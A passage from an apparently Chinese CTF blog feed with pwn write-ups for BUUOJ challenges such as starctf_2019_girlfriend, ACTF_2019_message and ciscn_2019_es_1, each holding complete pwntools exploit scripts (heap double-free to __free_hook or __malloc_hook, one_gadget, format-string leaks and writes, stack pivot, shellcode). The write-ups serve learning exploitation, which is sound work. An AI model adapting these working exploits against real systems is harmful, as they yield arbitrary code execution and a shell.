libc_base+0x619060+3848</h5><h5 id="具体的exit-hook可以看这，然后用one-gadget-然后输入的话得用字符串格式"><a href="#具体的exit-hook可以看这，然后用one-gadget-然后输入的话得用字符串格式" class="headerlink" title="具体的exit_hook可以看这，然后用one_gadget.然后输入的话得用字符串格式"></a>具体的exit_hook可以看这，然后用one_gadget.然后输入的话得用字符串格式</h5><p><a href="[exit_hook在pwn题中的应用 - 码农教程 (manongjc.com">exit_hook在pwn题中的应用</a>](<a href="http://www.manongjc.com/detail/21-aktzmrsypltrrll.html">http://www.manongjc.com/detail/21-aktzmrsypltrrll.html</a>))</p><pre><code class="lang-py">from pwn import*from LibcSearcher import *p=remote(&quot;node5.buuoj.cn&quot;,29131)#p=process(&quot;./bbctf_2020_write&quot;)context.log_level=&quot;debug&quot;libc=ELF(&#39;./libc-2.27.so&#39;)p.recvuntil(&#39;puts: &#39;)puts_addr=int(p.recv(14),16)base=puts_addr-libc.sym[&#39;puts&#39;]print(&#39;put&#39;+hex(puts_addr))p.sendline(&#39;w&#39;)exit_hook=base++0x619060+3848one=[0x4f2c5,0x4f322,0x10a38c]one_gadget=one[1]+basep.sendlineafter(&#39;ptr: &#39;,str(exit_hook))p.sendlineafter(&#39;val: &#39;,str(one_gadget))p.sendlineafter(&#39;(q)uit&#39;,&#39;q&#39;)#gdb.attach(p)#sleep(1)p.interactive()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ciscn_2019_c_5</title>
      <link href="/2024/03/08/ciscn-2019-c-5/"/>
      <url>/2024/03/08/ciscn-2019-c-5/</url>
      
        <content type="html"><![CDATA[<p> 保护全开</p><p>有格式化字符串漏洞但是用%n$p之类的会报错，用%p不会，算得偏移是8</p><p><img src="https://i0.imgs.ovh/2024/03/07/QOW8j.png" alt="image-20240308125027309"></p><p><img src="https://i0.imgs.ovh/2024/03/07/QO0AI.png" alt="image-20240308125159916"></p><pre><code class="lang-py">p.sendlineafter(&#39;name?&#39;,&#39;%p%p%p%p%p%p%p&#39;)p.recvuntil(&#39;59&#39;)io_stder=int(p.recv(14),16)</code></pre><h5 id="接收的话不是p-recvuntil-‘-x59’-，而是p-recvuntil-‘59’-，这里我犯了个错误"><a href="#接收的话不是p-recvuntil-‘-x59’-，而是p-recvuntil-‘59’-，这里我犯了个错误" class="headerlink" title="接收的话不是p.recvuntil(‘\x59’)，而是p.recvuntil(‘59’)，这里我犯了个错误"></a>接收的话不是p.recvuntil(‘\x59’)，而是p.recvuntil(‘59’)，这里我犯了个错误</h5><p><img src="https://i0.imgs.ovh/2024/03/07/Qe2aT.png" alt="image-20240308151037911"></p><p>这里对应第七个参数</p><p><img src="https://i0.imgs.ovh/2024/03/07/QeoBo.png" alt="image-20240308151240318"></p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import *p=process(&#39;./ciscn_2019_c_5&#39;)#p=remote(&#39;node5.buuoj.cn&#39;,28941)elf=ELF(&#39;./ciscn_2019_c_5&#39;)libc=elf.libcdef add(size,story):    p.sendlineafter(&#39;:&#39;,&#39;1&#39;)    p.sendlineafter(&#39;story:&#39;,str(size))    p.sendlineafter(&#39;story:&#39;,story)def edit():    p.sendlineafter(&#39;:&#39;,&#39;2&#39;)def show():    p.sendlineafter(&#39;:&#39;,&#39;3&#39;)def free(idx):    p.sendlineafter(&#39;:&#39;,&#39;4&#39;)    p.sendlineafter(&#39;index:&#39;,str(idx))def debug():    gdb.attach(p)    sleep(1)p.sendlineafter(&#39;name?&#39;,&#39;%p%p%p%p%p%p%p&#39;)p.recvuntil(&#39;59&#39;)debug()io_stder=int(p.recv(14),16)#.ljust(8,b&#39;\x00&#39;)p.sendlineafter(&#39;input your ID.&#39;,&#39;kkkk&#39;)base=io_stder-libc.sym[&#39;_IO_2_1_stderr_&#39;]system=base+libc.sym[&#39;system&#39;]print(&#39;io_st  &#39;+hex(io_stder)+&#39;system  &#39;+hex(system))free_hook=base+libc.sym[&#39;__free_hook&#39;]add(0x60,&#39;aaaa&#39;) #0add(0x60,&#39;bbbb&#39;) #1add(0x60,&#39;bin/sh\n&#39;) #2free(0)free(1)free(0)add(0x60,p64(free_hook)) #3add(0x60,&#39;aaaa&#39;) #4add(0x60,&#39;dddd&#39;) #5add(0x60,p64(system))free(2)#p.interactive()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>starctf_2019_girlfriend</title>
      <link href="/2024/03/06/starctf-2019-girlfriend/"/>
      <url>/2024/03/06/starctf-2019-girlfriend/</url>
      
        <content type="html"><![CDATA[<p>保护全开,本想以简单的uaf去解决，但是却会内存错误，所以这个方法不行</p><pre><code class="lang-py">from pwn import*from LibcSearcher import *#p=remote(&quot;node4.buuoj.cn&quot;,)p=process(&quot;./starctf_2019_girlfriend&quot;)context.log_level=&quot;debug&quot;libc=ELF(&#39;./libc-2.23.so&#39;)def add(size,content1,content2):    p.sendlineafter(&#39;Input your choice:&#39;,&#39;1&#39;)    p.sendlineafter(&quot;girl&#39;s name&quot;,str(size))    p.sendlineafter(&#39;please inpute her name:&#39;,content1)    p.sendlineafter(&#39;please input her call:&#39;,content2)def show(index):    p.sendlineafter(&#39;Input your choice:&#39;,&#39;2&#39;)    p.sendlineafter(&#39;Please input the index:&#39;,str(index))def free(index):    p.sendlineafter(&#39;Input your choice:&#39;,&#39;4&#39;)    p.sendlineafter(&#39;Please input the index:&#39;,str(index))add(0x20,&#39;aaaa&#39;,&#39;bbbb&#39;)add(0x80,&#39;aaaa&#39;,&#39;bbbb&#39;)free(0)free(1)show(0)p.recvuntil(&#39;name:&#39;)main_arena=u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))-88base=main_arena-0x10-libc.sym[&#39;__malloc_hook&#39;]system=base+libc.sym[&#39;system&#39;]free_hook=base+libc.sym[&#39;__free_hook&#39;]add(0x20,&#39;dddd&#39;,&#39;eeee&#39;)add(0x20,&#39;/bin/sh&#39;,&#39;cccc&#39;)print(&#39;main_arena&#39;+hex(main_arena))free(2) #2free(3) #3free(2)gdb.attach(p)sleep(1)add(0x20,p64(free_hook-0x10),&#39;dddd&#39;)add(0x20,&#39;cccc&#39;,&#39;dddd&#39;)add(0x20,&#39;eeee&#39;,&#39;vvvv&#39;)add(0x20,p64(system),&#39;dddd&#39;)p.interactive()</code></pre><p><img src="https://i0.imgs.ovh/2024/03/06/QwhQd.png" alt="image-20240307120041249"></p><p><img src="https://i0.imgs.ovh/2024/03/06/Qwk1T.png" alt="image-20240306215632879"></p><p><img src="https://i0.imgs.ovh/2024/03/06/Qw0vu.png" alt="image-20240306215708434"></p><h5 id="首先malloc一个0x80大小的堆，再申请0x60大小的，后面改成比0x60小的堆时都会出现内存报错，free堆0的时候不会和topchunk合并，得到main-arena-88"><a href="#首先malloc一个0x80大小的堆，再申请0x60大小的，后面改成比0x60小的堆时都会出现内存报错，free堆0的时候不会和topchunk合并，得到main-arena-88" class="headerlink" title="首先malloc一个0x80大小的堆，再申请0x60大小的，后面改成比0x60小的堆时都会出现内存报错，free堆0的时候不会和topchunk合并，得到main_arena+88"></a>首先malloc一个0x80大小的堆，再申请0x60大小的，后面改成比0x60小的堆时都会出现内存报错，free堆0的时候不会和topchunk合并，得到main_arena+88</h5><pre><code class="lang-py">add(0x80,&#39;aaaa&#39;,&#39;bbbb&#39;)add(0x60,&#39;cccc&#39;,&#39;ssss&#39;)add(0x60,&#39;dddd&#39;,&#39;eeee&#39;)free(0)show(0)p.recvuntil(&#39;name:&#39;)main_arena=u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))print(&#39;main_arena&#39;+hex(main_arena))malloc_hook=main_arena-88-0x10base=malloc_hook-libc.sym[&#39;__malloc_hook&#39;]</code></pre><pre><code class="lang-py">free(2)free(1)free(2)one = [0x45226, 0x4527a, 0xf03a4, 0xf1147]one_gadget=base+one[3]realloc=libc.sym[&#39;realloc&#39;]+base#这里的话得用到</code></pre><h5 id="realloc-hook-malloc-hook-0x8"><a href="#realloc-hook-malloc-hook-0x8" class="headerlink" title="realloc_hook=malloc_hook-0x8"></a>realloc_hook=malloc_hook-0x8</h5><pre><code class="lang-py">add(0x60,p64(malloc_hook-0x23),p64(malloc_hook-0x23))add(0x60,&#39;cccc&#39;,&#39;dddd&#39;)add(0x60,&#39;dddd&#39;,&#39;eeee&#39;)print(&#39;one_gadget=&#39;+hex(one_gadget)+&#39;   malloc=&#39;+hex(malloc_hook-0x23)+&#39;   realloc=&#39;+hex(realloc))payload=b&#39;a&#39;*(0x13-8)+p64(one_gadget)+p64(realloc+2)add(0x60,payload,&#39;cccc&#39;)</code></pre><p><img src="https://i0.imgs.ovh/2024/03/06/Qso0K.png" alt="image-20240307191637279"></p><h5 id="使用one-gadget的条件"><a href="#使用one-gadget的条件" class="headerlink" title="使用one_gadget的条件"></a>使用one_gadget的条件</h5><p><img src="https://i0.imgs.ovh/2024/03/06/Qsuaj.png" alt="image-20240307191828389"></p><h5 id="关于realloc函数调整函数栈帧的知识，关于为什么用realloc-2的地址"><a href="#关于realloc函数调整函数栈帧的知识，关于为什么用realloc-2的地址" class="headerlink" title="关于realloc函数调整函数栈帧的知识，关于为什么用realloc+2的地址"></a>关于realloc函数调整函数栈帧的知识，关于为什么用realloc+2的地址</h5><p><a href="[使用realloc函数来调整栈帧让one_gadget生效 | ZIKH26&#39;s Blog](https://zikh26.github.io/posts/f7fd9662.html">链接文本</a>)</p><h5 id="调试发现除了malloc-hook-0x23的地址可以改其它的地址都会报错，多1少1都不行"><a href="#调试发现除了malloc-hook-0x23的地址可以改其它的地址都会报错，多1少1都不行" class="headerlink" title="调试发现除了malloc_hook-0x23的地址可以改其它的地址都会报错，多1少1都不行"></a>调试发现除了malloc_hook-0x23的地址可以改其它的地址都会报错，多1少1都不行</h5><p><img src="https://i0.imgs.ovh/2024/03/06/QsU1O.png" alt="image-20240307193119248"></p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import*from LibcSearcher import *#p=remote(&quot;node5.buuoj.cn&quot;,25861)p=process(&quot;./starctf_2019_girlfriend&quot;)context.log_level=&quot;debug&quot;libc=ELF(&#39;./libc-2.23.so&#39;)def debug():    gdb.attach(p)    sleep(1)def add(size,content1,content2):    p.sendlineafter(&#39;Input your choice:&#39;,&#39;1&#39;)    p.sendlineafter(&quot;girl&#39;s name&quot;,str(size))    p.sendlineafter(&#39;please inpute her name:&#39;,content1)    p.sendlineafter(&#39;please input her call:&#39;,content2)def show(index):    p.sendlineafter(&#39;Input your choice:&#39;,&#39;2&#39;)    p.sendlineafter(&#39;Please input the index:&#39;,str(index))def free(index):    p.sendlineafter(&#39;Input your choice:&#39;,&#39;4&#39;)    p.sendlineafter(&#39;Please input the index:&#39;,str(index))#add(0x20,&#39;aaaa&#39;,&#39;bbbb&#39;)add(0x80,&#39;aaaa&#39;,&#39;bbbb&#39;)add(0x60,&#39;cccc&#39;,&#39;ssss&#39;)add(0x60,&#39;dddd&#39;,&#39;eeee&#39;)free(0)show(0)p.recvuntil(&#39;name:&#39;)main_arena=u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))print(&#39;main_arena&#39;+hex(main_arena))malloc_hook=main_arena-88-0x10base=malloc_hook-libc.sym[&#39;__malloc_hook&#39;]free(2)free(1)free(2)one = [0x45226, 0x4527a, 0xf03a4, 0xf1147]one_gadget=base+one[3]realloc=libc.sym[&#39;realloc&#39;]+baseadd(0x60,p64(malloc_hook-0x23),p64(malloc_hook-0x23))add(0x60,&#39;cccc&#39;,&#39;dddd&#39;)add(0x60,&#39;dddd&#39;,&#39;eeee&#39;)print(&#39;one_gadget=&#39;+hex(one_gadget)+&#39;   malloc-0x23=&#39;+hex(malloc_hook-0x23)+&#39;   realloc=&#39;+hex(realloc))payload=b&#39;a&#39;*(0x13-8)+p64(one_gadget)+p64(realloc+2)add(0x60,payload,&#39;cccc&#39;)debug()p.sendafter(&#39;Input your choice:&#39;,&#39;1&#39;)p.interactive()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ACTF_2019_message</title>
      <link href="/2024/03/05/ACTF-2019-message/"/>
      <url>/2024/03/05/ACTF-2019-message/</url>
      
        <content type="html"><![CDATA[<p>有uaf漏洞，但是打印的话会检查size，所以不能简单地uaf</p><p><img src="https://i0.imgs.ovh/2024/03/04/OYMIU.png" alt="image-20240305192928168"></p><pre><code class="lang-py">add(0x200,&#39;aaaa&#39;)add(0x200,&#39;aaaa&#39;)free(0)free(0)add(0x200,p64(0x60204c))add(0x200,&#39;aaaa&#39;)</code></pre><p><img src="https://i0.imgs.ovh/2024/03/04/OYkHR.png" alt="image-20240305194658879"></p><p>成功控制堆指针</p><pre><code>payload=p64(1)+p64(0)+b&#39;\x00&#39;*4+p64(0x200)+p64(0x60204c)+p64(0)*20add(0x200,payload)</code></pre><p><img src="https://i0.imgs.ovh/2024/03/04/OYScj.png" alt="image-20240305201228735"></p><pre><code class="lang-py">for i in range(8):    add(0x80,&#39;aaaa&#39;)#8for i in range(1,7):    free(i)free(8)</code></pre><p><img src="https://i0.imgs.ovh/2024/03/04/OYQSJ.png" alt="image-20240305201734649"></p><h5 id="add的大小是0x80，保证了满的时侯的那个bin放在unsorted-bin，最后两个倒序释放，防止和top-chunk合并"><a href="#add的大小是0x80，保证了满的时侯的那个bin放在unsorted-bin，最后两个倒序释放，防止和top-chunk合并" class="headerlink" title="add的大小是0x80，保证了满的时侯的那个bin放在unsorted bin，最后两个倒序释放，防止和top chunk合并"></a>add的大小是0x80，保证了满的时侯的那个bin放在unsorted bin，最后两个倒序释放，防止和top chunk合并</h5><pre><code class="lang-py">free(7)</code></pre><p>堆7指针是main_arena+96</p><p><img src="https://i0.imgs.ovh/2024/03/04/OYJC9.png" alt="image-20240305202521878"></p><p>我试了这种方法也可以show出来，不过edit的时候不能sendline，不然会覆盖掉一个字节，导致show的地址出错</p><pre><code class="lang-py">payload=p64(1)+p64(0)+b&#39;\x00&#39;*4+p64(0x200)+p64(0x60204c)+p64(0)*12+p64(0x80)edit(0,payload)show(7)</code></pre><p>这里因为用sendline所以出错了</p><p><img src="https://i0.imgs.ovh/2024/03/04/O875W.png" alt="image-20240305203854218"></p><p>或者用师傅的做法，不过我的更简单</p><pre><code class="lang-py">edit(0,payload)for i in range(7):    add(0x80,&#39;aaaa&#39;)add(0x8,&#39;aaaaaaa&#39;) #堆8，会在unsorted bin里拿show(8)</code></pre><p><img src="https://i0.imgs.ovh/2024/03/05/QAzk0.png" alt="image-20240306185549924"></p><pre><code class="lang-py">r.recvuntil(&#39;The message: aaaaaaa&#39;)main_arena=u64(r.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))-224 #这里减0x80再减96#libc2.23和2.27都是__malloc_hook=main_arena-0x10print(&#39;main_&#39;+hex(main_arena))base=main_arena-0x10-libc.sym[&#39;__malloc_hook&#39;]</code></pre><pre><code class="lang-py">payload=p64(1)+p64(0)+b&#39;\x00&#39;*4+p64(0x200)+p64(0x60204c)+p64(0x80)+p64(binsh)+p64(0x80)+p64(free_hook)edit(0,payload)edit(2,p64(system))</code></pre><p><img src="https://i0.imgs.ovh/2024/03/05/QA4wm.png" alt="image-20240306190111092"></p><p>最后有个地方就是free(1)会报错，得分开或者手动</p><p>exp</p><pre><code class="lang-python">from pwn import*from LibcSearcher import *#r=remote(&quot;node5.buuoj.cn&quot;,29647)r=process(&quot;./ACTF_2019_message&quot;)context.log_level=&quot;debug&quot;context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;)libc=ELF(&#39;./libc-2.27.so&#39;)elf=ELF(&#39;./ACTF_2019_message&#39;)def choice(nu):    r.sendlineafter(&#39;choice: &#39;, str(nu))def add(size,content):    choice(1)    r.sendlineafter(&#39;length of message:\n&#39;, str(size))    r.sendlineafter(&#39;input the message:\n&#39;, content)def free(idx):    choice(2)    r.sendlineafter(&#39;you want to delete:\n&#39;, str(idx))def edit(idx, content):    choice(3)    r.sendlineafter(&#39;you want to edit:\n&#39;, str(idx))    r.sendlineafter(&#39;edit the message:\n&#39;, content )def show(idx):    choice(4)    r.sendlineafter(&#39;want to display:\n&#39;, str(idx))add(0x200,&#39;aaaa&#39;) #0add(0x200,&#39;aaaa&#39;) #1free(0)free(0)add(0x200,p64(0x60204c))add(0x200,&#39;aaaa&#39;)payload=p64(1)+p64(0)+b&#39;\x00&#39;*4+p64(0x200)+p64(0x60204c)+p64(0)*20add(0x200,payload) #0for i in range(8):    add(0x80,&#39;aaaa&#39;)#8for i in range(1,7):    free(i)free(8) free(7)edit(0,payload)for i in range(7):    add(0x80,&#39;aaaa&#39;)add(0x10,&#39;aaaaaaa&#39;)show(8)r.recvuntil(&#39;The message: aaaaaaa&#39;)main_arena=u64(r.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))-224print(&#39;main_&#39;+hex(main_arena))base=main_arena-0x10-libc.sym[&#39;__malloc_hook&#39;]free_hook=base+libc.sym[&#39;__free_hook&#39;]system=base+libc.sym[&#39;system&#39;]binsh=base+ next(libc.search(b&#39;/bin/sh&#39;))print(hex(system))payload=p64(1)+p64(0)+b&#39;\x00&#39;*4+p64(0x200)+p64(0x60204c)+p64(0x80)+p64(binsh)+p64(0x80)+p64(free_hook)edit(0,payload)edit(2,p64(system))#gdb.attach(r)#sleep(1)r.sendlineafter(&#39;choice: &#39;,&#39;2&#39;)r.sendlineafter(&#39;you want to delete:\n&#39;,&#39;1&#39;)# 有时候得手动free(1),不然打不通，很离谱#free(1)r.interactive()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ACTF_2019_OneRepeater</title>
      <link href="/2024/03/02/ACTF-2019-OneRepeater/"/>
      <url>/2024/03/02/ACTF-2019-OneRepeater/</url>
      
        <content type="html"><![CDATA[<p><img src="https://i0.imgs.ovh/2024/03/01/78XMV.png" alt="image-20240302161950112"></p><h5 id="有可读可写可执行段，是道格式化字符串题，用shellcode做"><a href="#有可读可写可执行段，是道格式化字符串题，用shellcode做" class="headerlink" title="有可读可写可执行段，是道格式化字符串题，用shellcode做"></a>有可读可写可执行段，是道格式化字符串题，用shellcode做</h5><p><img src="https://i0.imgs.ovh/2024/03/01/78V9I.png" alt="image-20240302162059697"></p><p>1输入，会打印变量的栈地址，2格式化，可多次格式化，返回地址得在原来的基础上加0x10，因为这里leave以后并没有立即ret,而是lea     esp, [ecx-4]，调试发现时是add esp, 0x10，所以ret_addr=0x408+0x10+4</p><p><img src="https://i0.imgs.ovh/2024/03/01/78xet.png" alt="image-20240302165416987"></p><p>exp</p><pre><code class="lang-py">from pwn import*from LibcSearcher import *p=remote(&quot;node5.buuoj.cn&quot;,29221)#p=process(&quot;./ACTF_2019_OneRepeater&quot;)context.log_level=&quot;debug&quot;context(log_level=&#39;debug&#39;,arch=&#39;i386&#39;,os=&#39;linux&#39;)offset=16p.sendlineafter(&#39;Exit&#39;,&#39;1&#39;)p.recvline()addr = int(p.recv(8).strip(), 16)ret_addr=addr+0x418+4print(&#39;addr&#39;+hex(addr))&#39;&#39;&#39;payload=p32(ret_addr)+b&#39;%&#39;+str(addr%65536-4).encode()+b&#39;c&#39;+b&#39;%16$hn&#39;p.sendline(payload)p.sendlineafter(&#39;3) Exit&#39;,&#39;2&#39;)p.sendlineafter(&#39;3) Exit&#39;,&#39;1&#39;)payload=p32(ret_addr+2)+b&#39;%&#39;+str(addr//65536-4).encode()+b&#39;c&#39;+b&#39;%16$hn&#39;p.sendline(payload)&#39;&#39;&#39;payload=p32(ret_addr)+p32(ret_addr+2)+b&#39;%&#39;+str(addr%65536-8).encode()+b&#39;c&#39;+b&#39;%16$hn&#39;+b&#39;%&#39;+str(addr//65536-addr%65536).encode()+b&#39;c%17$hn&#39;p.sendline(payload)p.sendlineafter(&#39;3) Exit&#39;,&#39;2&#39;)p.sendlineafter(&#39;3) Exit&#39;,&#39;1&#39;)#gdb.attach(p)sleep(1)p.sendline(asm(shellcraft.sh()))p.sendlineafter(&#39;3) Exit&#39;,&#39;3&#39;)p.interactive()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>checkin</title>
      <link href="/2024/02/29/checkin/"/>
      <url>/2024/02/29/checkin/</url>
      
        <content type="html"><![CDATA[<h5 id="挺有意思的一道栈迁移"><a href="#挺有意思的一道栈迁移" class="headerlink" title="挺有意思的一道栈迁移"></a>挺有意思的一道栈迁移</h5><p><img src="https://i0.imgs.ovh/2024/02/28/7XZ5K.png" alt="image-20240229143947006"></p><h5 id="s1是全局变量，这里写rop泄露got表地址"><a href="#s1是全局变量，这里写rop泄露got表地址" class="headerlink" title="s1是全局变量，这里写rop泄露got表地址"></a>s1是全局变量，这里写rop泄露got表地址</h5><p><img src="https://i0.imgs.ovh/2024/02/28/7Xnr2.png" alt="image-20240229144209910"></p><h5 id="为了再一次执行程序，rop后面接的不是puts-plt"><a href="#为了再一次执行程序，rop后面接的不是puts-plt" class="headerlink" title="为了再一次执行程序，rop后面接的不是puts_plt"></a>为了再一次执行程序，rop后面接的不是puts_plt</h5><p><img src="https://i0.imgs.ovh/2024/02/28/7XpyV.png" alt="image-20240229144608441"></p><h5 id="而是调用puts函数的地址，既能泄露got表地址，又能再执行一次程序。"><a href="#而是调用puts函数的地址，既能泄露got表地址，又能再执行一次程序。" class="headerlink" title="而是调用puts函数的地址，既能泄露got表地址，又能再执行一次程序。"></a>而是调用puts函数的地址，既能泄露got表地址，又能再执行一次程序。</h5><p><img src="https://i0.imgs.ovh/2024/02/28/7XMJI.png" alt="image-20240229144545776"></p><h5 id="buf只能溢出到rbp，但是有两次leave，一个是sub-4018C7函数里的"><a href="#buf只能溢出到rbp，但是有两次leave，一个是sub-4018C7函数里的" class="headerlink" title="buf只能溢出到rbp，但是有两次leave，一个是sub_4018C7函数里的"></a>buf只能溢出到rbp，但是有两次leave，一个是sub_4018C7函数里的</h5><p><img src="https://i0.imgs.ovh/2024/02/28/7rKsK.png" alt="image-20240229151653874"></p><h5 id="上一个函数结束后到sub-401876函数里的，刚好能执行两次leave。"><a href="#上一个函数结束后到sub-401876函数里的，刚好能执行两次leave。" class="headerlink" title="上一个函数结束后到sub_401876函数里的，刚好能执行两次leave。"></a>上一个函数结束后到sub_401876函数里的，刚好能执行两次leave。</h5><p><img src="https://i0.imgs.ovh/2024/02/28/7rbi2.png" alt="image-20240229151743757"></p><h5 id="不过这里-unsigned-int-sub-401974-buf-属实不太懂，太抽象了，也不知道它具体是怎么检查的"><a href="#不过这里-unsigned-int-sub-401974-buf-属实不太懂，太抽象了，也不知道它具体是怎么检查的" class="headerlink" title="不过这里(unsigned int)sub_401974(buf)属实不太懂，太抽象了，也不知道它具体是怎么检查的"></a>不过这里(unsigned int)sub_401974(buf)属实不太懂，太抽象了，也不知道它具体是怎么检查的</h5><h5 id="两次的payload不太一样。"><a href="#两次的payload不太一样。" class="headerlink" title="两次的payload不太一样。"></a>两次的payload不太一样。</h5><h5 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h5><pre><code class="lang-py">payload1+=p64(pop_rdi)+p64(puts_got)+p64(puts_plt)p.sendafter(&#39;&gt;&#39;,payload1)payload2=b&#39;admin\x00\x00\x00&#39;+p64(0)*3+p64(bss)p.sendafter(&#39;Pass&#39;,payload2)</code></pre><h5 id="payload2"><a href="#payload2" class="headerlink" title="payload2"></a>payload2</h5><pre><code class="lang-py">payload1=b&#39;admin\x00\x00\x00&#39;*3+p64(one_gadget)p.sendafter(&#39;&gt;&#39;,payload1)payload2=b&#39;admin\x00\x00\x00&#39;*4+p64(bss+0x10)p.sendafter(&#39;Pass&#39;,payload2)</code></pre><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import*from LibcSearcher import *p=remote(&quot;node5.buuoj.cn&quot;,25691)#p=process(&quot;./login_pro&quot;)context.log_level=&quot;debug&quot;libc=ELF(&#39;./libc.So.6&#39;)bss=0x602400pop_rdi=0x401ab3puts_plt=0x4018b5puts_got=0x602028payload1=b&#39;admin\x00\x00\x00&#39;payload1+=p64(pop_rdi)+p64(puts_got)+p64(puts_plt)p.sendafter(&#39;&gt;&#39;,payload1)payload2=b&#39;admin\x00\x00\x00&#39;+p64(0)*3+p64(bss)p.sendafter(&#39;Pass&#39;,payload2)p.recvuntil(&#39;BaileGeBai\n&#39;)puts_got=u64(p.recvuntil(&#39;\n&#39;,drop=True).ljust(8,b&#39;\x00&#39;))print(hex(puts_got))base=puts_got-libc.sym[&#39;puts&#39;]one=[0x45226,0x4527a,0xf03a4,0xf1247]one_gadget=base+one[1]#gdb.attach(p)sleep(1)payload1=b&#39;admin\x00\x00\x00&#39;*3+p64(one_gadget)p.sendafter(&#39;&gt;&#39;,payload1)payload2=b&#39;admin\x00\x00\x00&#39;*4+p64(bss+0x10)p.sendafter(&#39;Pass&#39;,payload2)#p.sendline(payload)p.interactive()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ciscn_2019_es_1</title>
      <link href="/2024/01/22/ciscn-2019-es-1/"/>
      <url>/2024/01/22/ciscn-2019-es-1/</url>
      
        <content type="html"><![CDATA[<h4 id="ciscn-2019-es-1"><a href="#ciscn-2019-es-1" class="headerlink" title="ciscn_2019_es_1"></a>ciscn_2019_es_1</h4><h4 id="checksec一下，保护全开"><a href="#checksec一下，保护全开" class="headerlink" title="checksec一下，保护全开"></a>checksec一下，保护全开</h4><p><img src="https://i0.imgs.ovh/2024/01/22/sJtxT.png" alt="image-20230921162920468"></p><h4 id="add"><a href="#add" class="headerlink" title="add"></a>add<img src="https://i0.imgs.ovh/2024/01/22/sJzLl.png" alt="image-20230921163026621"></h4><h4 id="show函数，可以输出我们想要的地址然后算偏移"><a href="#show函数，可以输出我们想要的地址然后算偏移" class="headerlink" title="show函数，可以输出我们想要的地址然后算偏移"></a>show函数，可以输出我们想要的地址然后算偏移</h4><p><img src="https://i0.imgs.ovh/2024/01/22/sJgZp.png" alt="image-20230921163115792"></p><h4 id="delete函数，没有把指针置零，存在UAF漏洞"><a href="#delete函数，没有把指针置零，存在UAF漏洞" class="headerlink" title="delete函数，没有把指针置零，存在UAF漏洞"></a>delete函数，没有把指针置零，存在UAF漏洞</h4><p><img src="https://i0.imgs.ovh/2024/01/22/sJcDR.png" alt="image-20230921163210886"></p><h4 id="过程虽然理清，但仍然有点懵逼。"><a href="#过程虽然理清，但仍然有点懵逼。" class="headerlink" title="过程虽然理清，但仍然有点懵逼。"></a>过程虽然理清，但仍然有点懵逼。</h4><h4 id="先创三个堆"><a href="#先创三个堆" class="headerlink" title="先创三个堆"></a>先创三个堆</h4><pre><code class="lang-py">add(0x410,&quot;AAAA&quot;)add(0x20,&quot;AAAA&quot;)add(0x20,&quot;bin/sh&quot;)delete(0)</code></pre><h4 id="libc是2-27版本，就会有tachebin机制，free的大小大于0x400则可以绕过这个机制，而他的fd和bk指针都会指向main-arena-96这个地址，show函数把它输出出来并算出偏移量并算出free-hook的地址和system函数的地址。"><a href="#libc是2-27版本，就会有tachebin机制，free的大小大于0x400则可以绕过这个机制，而他的fd和bk指针都会指向main-arena-96这个地址，show函数把它输出出来并算出偏移量并算出free-hook的地址和system函数的地址。" class="headerlink" title="libc是2.27版本，就会有tachebin机制，free的大小大于0x400则可以绕过这个机制，而他的fd和bk指针都会指向main_arena+96这个地址，show函数把它输出出来并算出偏移量并算出free_hook的地址和system函数的地址。"></a>libc是2.27版本，就会有tachebin机制，free的大小大于0x400则可以绕过这个机制，而他的fd和bk指针都会指向main_arena+96这个地址，show函数把它输出出来并算出偏移量并算出free_hook的地址和system函数的地址。</h4><p><img src="https://i0.imgs.ovh/2024/01/22/sJR7N.png" alt="image-20230921163638325"></p><pre><code class="lang-py">show(0)malloc_hook_addr = u64(p.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))-96-0x10base_addr = malloc_hook_addr - libc.symbols[&#39;__malloc_hook&#39;]free_hook = base_addr + libc.symbols[&#39;__free_hook&#39;]system_addr = base_addr + libc.symbols[&#39;system&#39;]</code></pre><h4 id="然后用double-free，free两次堆2，然后堆2的如下，以及bin"><a href="#然后用double-free，free两次堆2，然后堆2的如下，以及bin" class="headerlink" title="然后用double free，free两次堆2，然后堆2的如下，以及bin"></a>然后用double free，free两次堆2，然后堆2的如下，以及bin</h4><p><img src="https://i0.imgs.ovh/2024/01/22/sJ1ju.png" alt="image-20230921164207791"></p><p><img src="https://i0.imgs.ovh/2024/01/22/sJUkd.png" alt="image-20230921164236453"></p><h4 id="bin指针链0x000055ac61f846c0这个地址记录了它本身"><a href="#bin指针链0x000055ac61f846c0这个地址记录了它本身" class="headerlink" title="bin指针链0x000055ac61f846c0这个地址记录了它本身"></a>bin指针链0x000055ac61f846c0这个地址记录了它本身</h4><h4 id="这里也许是tachebin的机制，再次malloc时，会先创建一个堆记录下一个堆的地址，而下一个堆正是我们add函数的过程，在0x000055ac61f846c0这个地址写入的是free-hook的地址，但是它依然还是在bin链中的，这就很不解，明明已经被使用了，这时bin链的指针指到了free-hook，我们再malloc"><a href="#这里也许是tachebin的机制，再次malloc时，会先创建一个堆记录下一个堆的地址，而下一个堆正是我们add函数的过程，在0x000055ac61f846c0这个地址写入的是free-hook的地址，但是它依然还是在bin链中的，这就很不解，明明已经被使用了，这时bin链的指针指到了free-hook，我们再malloc" class="headerlink" 